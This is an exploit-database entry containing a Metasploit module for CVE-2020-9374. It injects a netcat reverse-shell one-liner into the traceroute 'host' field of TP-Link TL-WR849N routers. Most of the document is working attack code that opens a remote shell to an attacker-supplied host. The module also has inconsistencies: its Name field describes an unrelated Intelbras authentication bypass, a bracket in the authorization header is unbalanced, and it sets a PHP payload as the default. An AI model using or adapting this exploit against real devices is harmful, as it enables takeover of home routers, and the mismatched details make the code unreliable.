# Exploit Title: TP LINK TL-WR849N - Remote Code Execution
# Date: 2020-02-29
# Exploit Author: Lucas Amorim (sh286)
# Vendor Homepage: https://www.tp-link.com/
# Software Link: https://www.tp-link.com/br/support/download/tl-wr849n/#Firmware
# Version: TL-WR849N 0.9.1 4.16
# Tested on: linux, windows
# CVE : CVE-2020-9374

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Intelbras Wireless N 150Mbps WRN240 - Authentication Bypass (Config Upload)',
      'Description' => %q{On TP-Link TL-WR849N 0.9.1 4.16 devices, a remote command execution vulnerability in 
        the diagnostics area can be exploited when an attacker sends specific shell metacharacters to the panels 
        traceroute feature.},
      'Author' =>
        [
          'Lucas Amorim ' # MSF module
        ],
      'License' => MSF_LICENSE,
      'Platform' => 'hardware',
      'References' =>
        [
          ['CVE', '2020-9374']
        ],
      'DisclosureDate' => 'Feb 24 2020',
      'DefaultOptions' => {
        'PAYLOAD' => 'php/meterpreter/reverse_tcp'
      },
      'Targets' => [
        ['Automatic', {}]
      ],
      'DefaultTarget'   => 0))
      register_options(
        [
          OptString.new('AUTH', [ true, "BASE64 AUTH", "" ])
        ]
      )

      deregister_options('VHOST')
  end


  def send_payload()
    exec_payload=("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f" % [datastore['LHOST'], datastore['LPORT']])
    data = ''
    data += '[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,8\x0d\x0a'
    data += 'maxHopCount=20\x0d\x0a'
    data += 'timeout=5\x0d\x0a'
    data += 'numberOfTries=1\x0d\x0a'
    data += 'host=\"$('+exec_payload+')\"\x0d\x0a'
    data += 'dataBlockSize=64\x0d\x0a'
    data += 'X_TP_ConnName=ewan_pppoe\x0d\x0a'
    data += 'diagnosticsState=Requested\x0d\x0a'
    data += 'X_TP_HopSeq=0\x0d\x0a'
    
    send_request_raw(
      'uri' => '/cgi?2',
      'method' => 'POST',
      'data' => data,
      'headers' => headers 
    )

    send_request_raw(
      'uri' => '/cgi?7',
      'method' => 'POST',
      'data' => '[ACT_OP_TRACERT#0,0,0,0,0,0#0,0,0,0,0,0]0,0\x0d\x0a',
      'headers' => headers 
    )
  end

  def headers
    {'Content-Type': 'text/plain', 'Referer': "http://#{datastore['RHOST']}/mainFrame.htm", "Authorization": "Basic #{[datastore['AUTH']}"}
  end

  def exploit
    print_good("Sending payload")
    send_payload()
  rescue
    print_error("Target does not seem to be vulnerable. Will exit now...")
  end
end